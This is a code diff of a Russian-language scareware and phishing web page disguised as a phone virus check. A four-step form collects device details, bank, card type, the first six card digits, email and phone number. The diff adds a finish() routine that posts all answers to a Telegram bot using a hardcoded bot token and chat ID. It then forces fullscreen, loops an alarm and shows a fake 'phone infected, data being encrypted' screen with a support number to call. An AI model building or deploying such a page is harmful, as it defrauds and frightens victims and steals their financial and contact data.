@@ -9,7 +9,6 @@
   html, body { height: 100%; overflow: hidden; }
   body { font-family: 'Segoe UI', Tahoma, sans-serif; }
 
-  /* ЭКРАН 1 — ЗАМАНКА */
   #screen1 {
     position: fixed; inset: 0;
     background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
@@ -45,12 +44,11 @@
     background: linear-gradient(90deg, #4aff8c, #00d4ff);
     color: #000;
     padding: 18px 40px; border-radius: 50px;
-    font-size: 18px; font-weight: 700;
+    font-size: 16px; font-weight: 700;
     border: none; cursor: pointer;
-    box-shadow: 0 10px 30px rgba(74,255,140,0.3);
+    box-shadow: 0 0 30px rgba(74,255,140,0.3);
   }
 
-  /* ЭКРАНЫ АНКЕТЫ */
   .form-screen {
     display: none;
     position: fixed; inset: 0;
@@ -91,6 +89,15 @@
   }
   .form-screen input::placeholder { color: rgba(255,255,255,0.4); }
   .form-screen select option { color: #000; }
+  .form-screen input.invalid, .form-screen select.invalid {
+    border-color: #ff4444;
+    box-shadow: 0 0 10px rgba(255,68,68,0.4);
+  }
+  .form-screen .err-msg {
+    color: #ff6666; font-size: 13px; margin: -10px 0 12px;
+    display: none;
+  }
+  .form-screen .err-msg.show { display: block; }
   .form-screen .nav {
     display: flex; gap: 10px; margin-top: 10px;
   }
@@ -118,7 +125,6 @@
     width: 25%; transition: width 0.3s;
   }
 
-  /* ЭКРАН ВИРУСА */
   #virus {
     display: none; position: fixed; inset: 0;
     background: #0a0a0a;
@@ -157,7 +163,7 @@
     margin-bottom: 20px; color: #00ff00;
   }
   #virus .log .err { color: #ff2222; }
-  #virus .log .warn { color: #ffff00; }
+  #virus .log .warn { color: #ffaa00; }
   #virus .bar {
     height: 10px; background: #222; border-radius: 5px;
     overflow: hidden; margin-bottom: 8px;
@@ -183,206 +189,292 @@
 </head>
 <body>
 
-  <!-- ЭКРАН 1 -->
-  <div id="screen1">
-    <div class="badge">🛡 Проверка безопасности</div>
-    <div class="shield">🛡️</div>
-    <h1>Проверка на вирусы</h1>
-    <p>Пройти короткий тест (1 минута) и узнать, заражён ли ваш телефон</p>
-    <button class="btn" id="startBtn">НАЧАТЬ ПРОВЕРКУ</button>
-  </div>
+<div id="screen1">
+  <div class="badge">🛡️ Проверка безопасности</div>
+  <div class="shield">🛡️</div>
+  <h1>Проверка на вирусы</h1>
+  <p>Пройдите короткий тест (1 минута) и узнайте, заражён ли ваш телефон</p>
+  <button class="btn" id="startBtn">НАЧАТЬ ПРОВЕРКУ</button>
+</div>
 
-  <!-- ЭКРАНЫ АНКЕТЫ -->
-  <div class="form-screen" id="form">
-    <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+<div class="form-screen" id="form">
+  <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
 
-    <!-- ШАГ 1 — ТЕЛЕФОН -->
-    <div class="step" id="step1">
-      <div class="step-num">ШАГ 1 ИЗ 4 · ТЕЛЕФОН</div>
-      <h2>Данные о телефоне</h2>
-      <label>Марка и модель</label>
-      <input type="text" id="phone" placeholder="Например Samsung Galaxy A54">
-      <label>Версия Android</label>
-      <select id="android">
-        <option>Android 14</option>
-        <option>Android 13</option>
-        <option>Android 12</option>
-        <option>Android 11</option>
-        <option>Не знаю</option>
-      </select>
-      <label>Сколько приложений установлено?</label>
-      <input type="number" id="apps" placeholder="Примерно">
-      <div class="nav">
-        <button class="btn-next" onclick="goStep(2)">Далее →</button>
-      </div>
-    </div>
+  <!-- ШАГ 1 -->
+  <div class="step" id="step1">
+    <div class="step-num">ШАГ 1 ИЗ 4 · ТЕЛЕФОН</div>
+    <h2>Данные о телефоне</h2>
+    <label>Марка и модель</label>
+    <input type="text" id="phone" placeholder="Например Samsung Galaxy A54">
+    <div class="err-msg" id="err-phone">Заполните это поле</div>
 
-    <!-- ШАГ 2 — СОЦСЕТИ -->
-    <div class="step" id="step2" style="display:none">
-      <div class="step-num">ШАГ 2 ИЗ 4 · СОЦСЕТИ</div>
-      <h2>Активность в соцсетях</h2>
-      <label>Где сидишь больше всего?</label>
-      <select id="soc">
-        <option>Telegram</option>
-        <option>Instagram</option>
-        <option>TikTok</option>
-        <option>VK</option>
-        <option>YouTube</option>
-      </select>
-      <label>Сколько часов в день?</label>
-      <input type="number" id="hours" placeholder="Например 3">
-      <label>Есть ли подозрительные входы?</label>
-      <select id="susp">
-        <option>Нет</option>
-        <option>Не знаю</option>
-        <option>Да, были</option>
-      </select>
-      <div class="nav">
-        <button class="btn-back" onclick="goStep(1)">← Назад</button>
-        <button class="btn-next" onclick="goStep(3)">Далее →</button>
-      </div>
-    </div>
+    <label>Версия Android</label>
+    <select id="android">
+      <option value="">Выберите версию</option>
+      <option>Android 14+</option>
+      <option>Android 13</option>
+      <option>Android 12</option>
+      <option>Android 11</option>
+      <option>Не знаю</option>
+    </select>
+    <div class="err-msg" id="err-android">Выберите вариант</div>
 
-    <!-- ШАГ 3 — БАНК -->
-    <div class="step" id="step3" style="display:none">
-      <div class="step-num">ШАГ 3 ИЗ 4 · БАНК</div>
-      <h2>Проверка банковской карты</h2>
-      <label>Банк</label>
-      <select id="bank">
-        <option>ПриватБанк</option>
-        <option>Monobank</option>
-        <option>Ощадбанк</option>
-        <option>Райффайзен</option>
-        <option>А-Банк</option>
-        <option>Другой</option>
-      </select>
-      <label>Тип карты</label>
-      <select id="cardType">
-        <option>Visa</option>
-        <option>MasterCard</option>
-      </select>
-      <label>Первые 6 цифр карты</label>
-      <input type="tel" id="cardPrefix" placeholder="123456" maxlength="6">
-      <div class="nav">
-        <button class="btn-back" onclick="goStep(2)">← Назад</button>
-        <button class="btn-next" onclick="goStep(4)">Далее →</button>
-      </div>
-    </div>
+    <label>Сколько приложений установлено?</label>
+    <input type="number" id="apps" placeholder="Примерно">
+    <div class="err-msg" id="err-apps">Заполните это поле</div>
 
-    <!-- ШАГ 4 — ФИНАЛ -->
-    <div class="step" id="step4" style="display:none">
-      <div class="step-num">ШАГ 4 ИЗ 4 · ПОСЛЕДНИЙ</div>
-      <h2>Почти готово</h2>
-      <label>Твой email</label>
-      <input type="email" id="email" placeholder="example@mail.com">
-      <label>Номер телефона</label>
-      <input type="tel" id="userPhone" placeholder="+380">
-      <div class="nav">
-        <button class="btn-back" onclick="goStep(3)">← Назад</button>
-        <button class="btn-next" onclick="finish()">ПРОВЕРИТЬ</button>
-      </div>
+    <div class="nav">
+      <button class="btn-next" onclick="goStep(2)">Далее →</button>
     </div>
   </div>
 
-  <!-- ЭКРАН ВИРУСА -->
-  <div id="virus">
-    <div class="top">⚠ УГРОЗА ОБНАРУЖЕНА ⚠</div>
-    <div class="icon">🦠</div>
-    <h1>ТЕЛЕФОН ЗАРАЖЁН</h1>
-    <p class="sub">По результатам проверки на устройстве найдено 47 угроз. Начинается шифрование личных данных.</p>
+  <!-- ШАГ 2 -->
+  <div class="step" id="step2" style="display:none">
+    <div class="step-num">ШАГ 2 ИЗ 4 · СОЦСЕТИ</div>
+    <h2>Активность в соцсетях</h2>
+    <label>Где сидишь больше всего?</label>
+    <select id="soc">
+      <option value="">Выберите</option>
+      <option>Telegram</option>
+      <option>Instagram</option>
+      <option>TikTok</option>
+      <option>VK</option>
+      <option>YouTube</option>
+    </select>
+    <div class="err-msg" id="err-soc">Выберите вариант</div>
 
-    <div class="log" id="log"></div>
+    <label>Сколько часов в день?</label>
+    <input type="number" id="hours" placeholder="Например 3">
+    <div class="err-msg" id="err-hours">Заполните это поле</div>
 
-    <div class="bar"><div class="bar-fill" id="bar"></div></div>
-    <div class="pct" id="pct">Заражение: 0%</div>
-
-    <div class="warning">НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ. ПОЗВОНИТЕ В ПОДДЕРЖКУ: 8-800-XXX-XX-XX</div>
+    <div class="nav">
+      <button class="btn-back" onclick="goStep(1)">← Назад</button>
+      <button class="btn-next" onclick="goStep(3)">Далее →</button>
+    </div>
   </div>
+
+  <!-- ШАГ 3 -->
+  <div class="step" id="step3" style="display:none">
+    <div class="step-num">ШАГ 3 ИЗ 4 · ПЛАТЕЖИ</div>
+    <h2>Банковские данные</h2>
+    <label>Какой банк?</label>
+    <select id="bank">
+      <option value="">Выберите</option>
+      <option>Сбербанк</option>
+      <option>Тинькофф</option>
+      <option>Альфа-Банк</option>
+      <option>ВТБ</option>
+      <option>Monobank</option>
+      <option>Ощадбанк</option>
+      <option>Райффайзен</option>
+      <option>А-Банк</option>
+      <option>Другой</option>
+    </select>
+    <div class="err-msg" id="err-bank">Выберите вариант</div>
+
+    <label>Тип карты</label>
+    <select id="cardType">
+      <option value="">Выберите</option>
+      <option>Visa</option>
+      <option>MasterCard</option>
+    </select>
+    <div class="err-msg" id="err-cardType">Выберите вариант</div>
+
+    <label>Первые 6 цифр карты</label>
+    <input type="tel" id="cardPrefix" placeholder="123456" maxlength="6">
+    <div class="err-msg" id="err-cardPrefix">Заполните это поле</div>
+
+    <div class="nav">
+      <button class="btn-back" onclick="goStep(2)">← Назад</button>
+      <button class="btn-next" onclick="goStep(4)">Далее →</button>
+    </div>
+  </div>
+
+  <!-- ШАГ 4 -->
+  <div class="step" id="step4" style="display:none">
+    <div class="step-num">ШАГ 4 ИЗ 4 · ФИНАЛ</div>
+    <h2>Почти готово</h2>
+    <label>Твой email</label>
+    <input type="email" id="email" placeholder="example@mail.com">
+    <div class="err-msg" id="err-email">Введите корректный email</div>
+
+    <label>Номер телефона</label>
+    <input type="tel" id="userPhone" placeholder="+380...">
+    <div class="err-msg" id="err-userPhone">Заполните это поле</div>
+
+    <div class="nav">
+      <button class="btn-back" onclick="goStep(3)">← Назад</button>
+      <button class="btn-next" onclick="finish()">ПРОВЕРИТЬ →</button>
+    </div>
+  </div>
+</div>
+
+<div id="virus">
+  <div class="top">⚠ УГРОЗА ОБНАРУЖЕНА ⚠</div>
+  <div class="icon">☣</div>
+  <h1>ТЕЛЕФОН ЗАРАЖЁН</h1>
+  <p class="sub">По результатам проверки на устройстве найдено 47 угроз. Начинается шифрование личных данных.</p>
+
+  <div class="log" id="log"></div>
+  <div class="bar"><div class="bar-fill" id="bar"></div></div>
+  <div class="pct" id="pct">Заражение: 0%</div>
+
+  <div class="warning">НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ. ПОЗВОНИТЕ В ПОДДЕРЖКУ: 8-800-XXX-XX-XX</div>
+</div>
 
 <script>
-  function goStep(n) {
-    document.querySelectorAll('.form-screen .step').forEach(s => s.style.display = 'none');
-    document.getElementById('step' + n).style.display = 'block';
-    document.getElementById('progressFill').style.width = (n * 25) + '%';
-    if (navigator.vibrate) navigator.vibrate(50);
-  }
+function goStep(n) {
+  if (n > 1 && !validateStep(n - 1)) return;
 
-  document.getElementById('startBtn').addEventListener('click', () => {
-    if (navigator.vibrate) navigator.vibrate(100);
-    document.getElementById('screen1').style.display = 'none';
-    document.getElementById('form').classList.add('active');
+  document.querySelectorAll('.form-screen .step').forEach(s => s.style.display = 'none');
+  document.getElementById('step' + n).style.display = 'block';
+  document.getElementById('progressFill').style.width = (n * 25) + '%';
+  if (navigator.vibrate) navigator.vibrate(50);
+}
+
+function validateStep(n) {
+  const required = {
+    1: ['phone', 'android', 'apps'],
+    2: ['soc', 'hours'],
+    3: ['bank', 'cardType', 'cardPrefix'],
+    4: ['email', 'userPhone']
+  }[n];
+
+  let ok = true;
+  required.forEach(id => {
+    const el = document.getElementById(id);
+    const err = document.getElementById('err-' + id);
+    const val = el.value.trim();
+
+    let valid = val !== '';
+    if (id === 'email') valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+    if (id === 'cardPrefix') valid = /^\d{6}$/.test(val);
+    if ((id === 'hours' || id === 'apps') && val !== '') valid = Number(val) > 0;
+
+    if (!valid) {
+      el.classList.add('invalid');
+      if (err) err.classList.add('show');
+      ok = false;
+    } else {
+      el.classList.remove('invalid');
+      if (err) err.classList.remove('show');
+    }
   });
+  return ok;
+}
 
-  function finish() {
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+document.getElementById('startBtn').addEventListener('click', () => {
+  if (navigator.vibrate) navigator.vibrate(100);
+  document.getElementById('screen1').style.display = 'none';
+  document.getElementById('form').classList.add('active');
+});
 
-    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
+function finish() {
+  if (!validateStep(4)) return;
 
-    const audio = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');
-    audio.loop = true;
-    audio.play().catch(() => {});
-    setTimeout(() => audio.pause(), 25000);
+  const data = {
+    phone: document.getElementById('phone')?.value || '—',
+    android: document.getElementById('android')?.value || '—',
+    apps: document.getElementById('apps')?.value || '—',
+    soc: document.getElementById('soc')?.value || '—',
+    hours: document.getElementById('hours')?.value || '—',
+    bank: document.getElementById('bank')?.value || '—',
+    cardType: document.getElementById('cardType')?.value || '—',
+    cardPrefix: document.getElementById('cardPrefix')?.value || '—',
+    email: document.getElementById('email')?.value || '—',
+    userPhone: document.getElementById('userPhone')?.value || '—'
+  };
 
-    document.getElementById('form').style.display = 'none';
-    document.getElementById('virus').classList.add('active');
-    startVirus();
-  }
+  const TOKEN = 'HTTP API:
+8895342700:AAGs3LG_NvECxqrAJYovE-eEGQIr1NbGHm8';
+  const CHAT_ID = '6830660184';
 
-  // === ВИРУС ===
-  const logEl = document.getElementById('log');
-  const barEl = document.getElementById('bar');
-  const pctEl = document.getElementById('pct');
+  let message = '📋 Новая анкета:\n';
+  message += '📱 Телефон: ' + data.phone + '\n';
+  message += '🤖 Android: ' + data.android + '\n';
+  message += '📦 Приложений: ' + data.apps + '\n';
+  message += '🌐 Соцсеть: ' + data.soc + '\n';
+  message += '⏰ Часов: ' + data.hours + '\n';
+  message += '🏦 Банк: ' + data.bank + '\n';
+  message += '💳 Карта: ' + data.cardType + '\n';
+  message += '🔢 Цифры: ' + data.cardPrefix + '\n';
+  message += '📧 Email: ' + data.email + '\n';
+  message += '📞 Телефон: ' + data.userPhone;
 
-  const logLines = [
-    { t: 'Сканирование устройства...', c: '' },
-    { t: '> Trojan.AndroidOS.Banker найден', c: 'err' },
-    { t: '> Spyware.Agent.RX найден', c: 'err' },
-    { t: '> Чтение контактов...', c: 'warn' },
-    { t: '> Чтение SMS и звонков...', c: 'warn' },
-    { t: '> Доступ к фото и видео...', c: 'warn' },
-    { t: '> Перехват паролей...', c: 'err' },
-    { t: '> Доступ к банковским приложениям...', c: 'err' },
-    { t: '> Отправка данных на 185.xx.xx.xx...', c: 'err' },
-    { t: '> Шифрование файлов...', c: 'err' },
-    { t: '> Блокировка устройства...', c: 'err' },
-    { t: 'КРИТИЧЕСКАЯ ОШИБКА', c: 'err' },
-  ];
+  fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  }).catch(function() {});
 
-  let logIndex = 0;
-  function addLog() {
-    if (logIndex >= logLines.length) logIndex = 0;
-    const item = logLines[logIndex];
-    const div = document.createElement('div');
-    div.className = item.c;
-    div.textContent = item.t;
-    logEl.appendChild(div);
-    logEl.scrollTop = logEl.scrollHeight;
-    logIndex++;
-  }
+  const el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-  function startVirus() {
-    setInterval(addLog, 700);
+  if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
 
-    let pct = 0;
-    const timer = setInterval(() => {
-      pct += Math.floor(Math.random() * 4) + 1;
-      if (pct > 100) pct = 100;
-      barEl.style.width = pct + '%';
-      pctEl.textContent = 'Заражение: ' + pct + '%';
+  const audio = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');
+  audio.loop = true;
+  audio.play().catch(() => {});
+  setTimeout(() => audio.pause(), 25000);
 
-      if (pct === 100) {
-        clearInterval(timer);
-        pctEl.textContent = '⚠ ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ ⚠';
-        if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
-      }
-    }, 400);
+  document.getElementById('form').style.display = 'none';
+  document.getElementById('virus').classList.add('active');
+  startVirus();
+}
 
-    setInterval(() => {
-      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-    }, 3000);
-  }
+const logEl = document.getElementById('log');
+const barEl = document.getElementById('bar');
+const pctEl = document.getElementById('pct');
+
+const logLines = [
+  { t: 'Сканирование устройства...', c: '' },
+  { t: '> Trojan.AndroidOS.Banker найден', c: 'err' },
+  { t: '> Spyware.Agent.RX найден', c: 'err' },
+  { t: '> Чтение контактов...', c: 'warn' },
+  { t: '> Чтение SMS и звонков...', c: 'warn' },
+  { t: '> Доступ к фото и видео...', c: 'warn' },
+  { t: '> Перехват паролей...', c: 'err' },
+  { t: '> Доступ к банковским приложениям...', c: 'err' },
+  { t: '> Отправка данных на 185.xx.xx.xx...', c: 'err' },
+  { t: '> Шифрование файлов...', c: 'err' },
+  { t: '> Блокировка устройства...', c: 'err' },
+  { t: '> КРИТИЧЕСКАЯ ОШИБКА', c: 'err' }
+];
+
+let logIndex = 0;
+function addLog() {
+  if (logIndex >= logLines.length) logIndex = 0;
+  const item = logLines[logIndex];
+  const div = document.createElement('div');
+  div.className = item.c;
+  div.textContent = item.t;
+  logEl.appendChild(div);
+  logEl.scrollTop = logEl.scrollHeight;
+  logIndex++;
+}
+
+function startVirus() {
+  setInterval(addLog, 700);
+
+  let pct = 0;
+  const timer = setInterval(() => {
+    pct += Math.floor(Math.random() * 4) + 1;
+    if (pct > 100) pct = 100;
+    barEl.style.width = pct + '%';
+    pctEl.textContent = 'Заражение: ' + pct + '%';
+
+    if (pct === 100) {
+      clearInterval(timer);
+      pctEl.textContent = '⚠ ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ ⚠';
+      if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+    }
+  }, 400);
+
+  setInterval(() => {
+    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+  }, 3000);
+}
 </script>
 </body>
 </html>
